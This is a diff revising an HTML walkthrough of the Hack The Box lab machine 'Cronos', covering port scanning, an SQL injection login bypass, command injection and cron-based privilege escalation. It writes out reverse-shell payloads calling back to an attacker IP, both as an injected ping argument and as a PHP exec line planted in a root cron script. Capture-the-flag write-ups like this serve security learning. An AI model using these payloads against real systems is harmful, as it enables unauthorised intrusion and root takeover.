@@ -12,14 +12,14 @@
     
     <ul>
         <li><strong>-p- --open</strong>: Scans all ports and shows open ones.</li>
-        <li><strong>-sS</strong>: SYN stealth scan.</li>
-        <li><strong>-Pn</strong>: Disable ICMP Echo request.</li>
+        <li><strong>-sS       </strong>: SYN stealth scan.</li>
+        <li><strong>-Pn       </strong>: Disable ICMP Echo request.</li>
         <li><strong>--min-rate</strong>: How many packets should be sent simultaneously.</li>
-        <li><strong>-n</strong>: disables DNS resolution.</li>
-        <li><strong>-vvv</strong>: Maximum verbosity for real-time results.</li>
+        <li><strong>-n        </strong>: disables DNS resolution.</li>
+        <li><strong>-vvv      </strong>: Maximum verbosity for real-time results.</li>
     </ul>
 
-    <p>Ports 22 (SSH), 53(DNS) and 80 (HTTP) are open. Service scan:</p>
+    <p>The ports 22 (SSH), 53(DNS) and 80 (HTTP) are open. Now enumerating these :</p>
     <div class="terminal-box">nmap -sC -sV -p22,53,80  10.10.10.13</div>
         
     <ul>
@@ -27,7 +27,7 @@
         <li><strong>-sV</strong>: Enumerates for the version running.</li>
     </ul>
 
-    <p>The domain is <code>cronos.htb</code>. I updated my <code>/etc/hosts</code>:</p>
+    <p>Found the domain name <code>cronos.htb</code>. I update my <code>/etc/hosts</code>:</p>
 
     <div class="terminal-box">echo "10.10.10.13 cronos.htb" | sudo tee -a /etc/hosts</div>
         
@@ -48,16 +48,16 @@
 
     <h3 class="step-header">2. Command Injection</h3>
 
-    <p>I tried default credentials, but in the end I passed the login page with SQLi injection.</p>
-    <div class="terminal-box">admin' -- </div>
+    <p>I tried default credentials, but in the end I passed the login page with SQL injection.</p>
+    <div class="terminal-box">admin' -- ## The SQL comment syntax requires a terminating whitespace character after the dashes.</div>
     <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630161409.png">
 
     <p>I logged in and I can see the headers : <code>Net Tool v0.1</code></p>
     <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630161454.png">
-    <p>It looks like a ping command, since there is a "traceroute" and an "execute" button.</p>
+    <p>It looks like a command, since there is a "traceroute" and an "execute" button.</p>
     <p>Before I continue I open a listener to my machine.</p>
     <div class="terminal-box">nc -lvnp 4445</div>
-    <p>Then tried to do a Command Injection to get a reverse shell:</p>
+    <p>Then I used Command Injection to get a reverse shell:</p>
     <div class="terminal-box">8.8.8.8; bash -c 'sh -i >& /dev/tcp/10.10.14.17/4445 0>&1'</div>
     <p>Back to my listener, I have a shell as <code>www-data</code>.</p>
     <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630161850.png">
@@ -77,11 +77,11 @@
     <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630162031.png">
 
     <ul>
-        <li><strong>* * * * * root...</strong>runs every minute as root.</li>
+        <li><strong>* * * * * root ... </strong>: runs every minute as root.</li>
     </ul>
-    <p>I can see that I have write permissions over this file.</p>
+    <p>I can see that I have write permissions over this <code>artisan</code> file.</p>
     <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630162306.png">
-    <p>I copied the content of the file and I added a small command in the top of it to get a reverse shell as root.</p>
+    <p>I added a small command in the top of it to get a reverse shell as root.</p>
     <div class="terminal-box">exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.17/4446 0>&1'");</div>
     <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250630162422.png">
     <p>I set my listener and after about a minute I got the root shell.</p>
